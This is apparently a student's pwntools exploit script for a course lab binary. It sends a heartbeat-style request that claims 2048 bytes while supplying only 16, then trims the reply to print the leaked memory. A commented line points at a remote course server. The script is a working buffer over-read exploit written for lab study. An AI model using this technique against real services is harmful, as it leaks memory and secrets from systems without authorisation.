#!/usr/bin/python3
# 2022.09.27.1803.EST
from pwn import *

with gdb.debug("./lab4-3.bin") as p:
#with remote("csc748.hostbin.org", 7043) as p:
    #payload = b"1024" + b":" + b"A"*1024 + b"\n"
    #payload = b"64" + b":" + b"A"*64 + b"\n"
    #payload = b"2048" + b":" + b"A"*1024 + b"\n"
    payload = b"2048" + b":" + b"A"*16 + b"\n"

    banner = p.recv()
    #print(banner.decode("utf-8"))

    p.send(payload)

    response = p.recv()
    prompt_len = 31
    data = response[prompt_len:]    # Sending heart beat response...\n
    data = data[16:]    # Length of actual data sent
    end_len = 35
    data = data[:-end_len]    # \nWaiting for heart beat request...\n

    padding = b"\x00"*0
    data = padding + data

    print(data)

    p.interactive()
